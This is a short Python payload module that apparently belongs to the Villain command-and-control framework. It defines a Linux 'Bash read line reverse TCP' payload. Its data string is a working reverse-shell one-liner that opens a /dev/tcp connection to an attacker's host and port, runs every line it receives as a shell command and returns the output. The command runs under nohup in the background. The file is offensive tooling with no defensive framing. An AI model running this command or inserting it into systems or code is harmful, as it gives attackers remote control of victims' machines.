# This module is part of the "Villain C2 Framework"

from typing import ClassVar


class Payload:

    info: ClassVar[dict] = {
        'Title' : 'Bash read line reverse TCP',
        'Author' : 'Unknown',
        'Description' : 'Bash read line reverse TCP',
        'References' : ['https://revshells.com']
    }

    meta: ClassVar[dict] = {
        'handler' : 'netcat',
        'type' : 'bash-read-line',
        'os' : 'linux'  
    }

    config: ClassVar[dict] = {}

    parameters: ClassVar[dict] = {
        'lhost' : None
    }

    attrs: ClassVar[dict] = {}

    data = "nohup `exec 5<>/dev/tcp/*LHOST*/*LPORT*;cat <&5 | while read line; do $line 2>&5 >&5; done` &"
